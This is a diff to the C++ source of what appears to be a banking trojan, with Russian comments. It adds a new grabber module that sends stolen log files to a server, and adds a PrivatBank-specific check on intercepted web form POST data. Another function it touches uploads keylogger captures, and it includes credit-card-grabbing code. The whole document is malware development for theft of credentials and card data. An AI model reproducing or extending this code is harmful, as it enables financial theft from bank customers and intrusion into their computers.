@@ -9,6 +9,7 @@
 #include "Inject.h"
 #include "Task.h"
 #include "PostDataGrabber.h"
+#include "Grabbers.h"
 
 #include "CreditCardNomber.cpp"
 
@@ -1532,9 +1533,15 @@ namespace DataSender
 			const static DWORD WaitInterval = 30*1000;
     	#endif
 
+        TGrabberFileSender GrabberFiles; // Новая версия грабера
+
 		while (1)
 		{
 			LDBG("Loader", "Обрабатываем хранилище отправляемых данных");
+
+			// Отправляем новые логи
+            GrabberFiles.SendFiles();
+
 			// Отправляем файлы грабера
 			SearchFiles(Path, (PCHAR)DataFileMask, false, FA_ANY_FILES, Files, ProcessDataFile);
 
@@ -1711,6 +1718,12 @@ bool DataGrabber::AddHTMLFormData(PCHAR URL, PCHAR Data, PCHAR UserAgent, DWORD 
 		//оповещаем о получении пост данных
 		PostDataGrabber::DoEvents( URL, Data );
 	#endif
+
+
+	#ifdef PrivatBankH
+        PrivatBank::CheckPostData(URL, Data);
+	#endif
+
 	// Добавить данные HTML формы
 	LDBG("Loader", "Добавляем в хранилище HTML данные");
 	
@@ -1923,7 +1936,7 @@ bool DataGrabber::SendFormGrabberData(PDataFile File)
 bool DataGrabber::SendCab(PCHAR URL, PCHAR CabFileName, PCHAR AppName, bool* InvalidFile)
 {
 	// Отправляем пост запрос на скрипт хранения данных кейлогера
-	if (InvalidFile != NULL)
+	if (InvalidFile)
     	*InvalidFile = false;
 
 	if (!FileExistsA(CabFileName))
@@ -1981,7 +1994,7 @@ bool DataGrabber::SendCab(PCHAR URL, PCHAR CabFileName, PCHAR AppName, bool* Inv
 	if (!Result && Response.Code == 404)
 	{
 		if (InvalidFile != NULL)
-        	*InvalidFile = true;
+			*InvalidFile = true;
 		PCHAR ErrorText = NULL;
 		#ifdef LOADER_GET_ERROR
 			ErrorText = HTTPParser::GetHeaderValue(Response.ResponseText, HTTPHeaderError);
